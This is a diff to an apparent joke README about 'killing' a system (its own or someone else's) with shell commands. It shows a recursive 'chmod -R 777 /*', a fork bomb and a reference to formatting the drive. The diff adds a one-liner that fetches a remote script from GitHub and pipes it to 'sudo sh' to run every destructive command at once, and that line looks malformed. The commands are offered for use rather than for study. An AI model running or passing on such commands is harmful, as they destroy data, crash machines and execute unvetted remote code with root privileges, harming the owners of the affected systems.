@@ -3,6 +3,9 @@ Kill your (or not yours) system with style. Many ways on many languages to make 
 
 # Bash
 
+The commands above should work on Android, Linux, MacOS, and others systems who run on the bash interpreter.
+<br />
+<br />
 ```
 sudo chmod -R 777 /*; 
 ```
@@ -42,5 +45,12 @@ This will format your drive entirely.
 : () {: |: &} ;:
 ```
 I's called fork bomb, and should make your system crashes, if you have one.
+<br />
+<br />
+
+```
+wget https://raw.githubusercontent.com/willnaoosmit/Dumb-ways-to-kill-your-system/master/bash/script.sh -O | sudo sh
+```
+This command will download and run automatically the file with all the bash commands above.
 <br />
 <br />
